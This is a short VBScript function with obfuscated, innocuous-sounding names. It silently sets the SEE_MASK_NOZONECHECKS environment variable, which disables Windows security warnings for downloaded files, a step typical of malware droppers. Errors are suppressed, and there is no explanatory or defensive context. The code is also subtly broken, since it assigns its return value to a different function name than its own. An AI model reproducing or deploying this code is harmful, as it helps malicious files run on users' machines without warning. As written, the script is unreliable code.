Function ReadBackupCipher24()
On Error Resume Next
  Dim strSegment34,strQueue23,strSyncBuffer83
  Set strSegment34=CreateObject("WScript.Shell")
  strQueue23=strSegment34.ExpandEnvironmentStrings("%TEMP%")
  strSyncBuffer83=strSegment34.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strQueue23)>0 And Len(strSyncBuffer83)>0 Then
    strSegment34.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ExtractSyncToken35=1
    Exit Function
  End If
  ExtractSyncToken35=0
End Function

